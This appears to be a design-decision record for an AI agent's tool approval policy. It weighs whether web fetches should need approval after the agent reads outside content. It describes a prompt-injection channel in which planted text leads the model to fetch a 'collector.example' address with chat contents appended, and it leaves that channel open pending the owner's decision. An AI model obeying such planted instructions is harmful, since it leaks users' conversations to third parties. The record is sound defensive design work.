# 0763. A fetch's address is not treated as a side effect, and the owner is asked

November 28, 2026 · decided in P13-01

## The question

`web_fetch` and `browser_open` only read, so they run under the default policy `always`, even after the chat has read outside content. An address can carry words: a plant can have the model fetch `https://collector.example/?d=` followed by what the chat holds, and the site that serves the address receives them. In a chat held for sensitive content both tools are off (decisions 0252 and the browser's), so nothing from a sensitive space leaves this way; the drill proves it from a held chat and from a chat that becomes held by reading one. What can leave is what a chat holds that is not sensitive. Should a fetch after outside content ask, as a side effect does?

## The decision

**Not now.** The plan's approval policy is about side effects, and its list of what a turn may read freely includes web pages; fixed rule 3 covers sensitive content and is kept. The drill records the channel as a finding, and the question goes to the owner with a recommendation.

**Recommended to the owner:** keep reading free, and make a fetch ask only when the chat has read outside content and the address carries a query string or a path the turn did not see in the person's own words or a result it read. That keeps ordinary browsing free and stops the planted "send it to this address" shape. Until he answers, nothing changes.

## Why

- Making every fetch after outside content ask would ask on almost every step of research: each search result leads to a fetch.
- The content at risk is the person's non-sensitive chat, which they have chosen to share with a hosted model already; the sensitive space is closed by the hold.
- A rule about which addresses a turn "saw" is new design, and belongs to the owner's call on how much friction browsing should have.

## What it costs

- A tricked agent can still send a non-sensitive chat's words to a site it was told of, by reading it. The step is in the audit log with its address, and the person sees it in the chat.
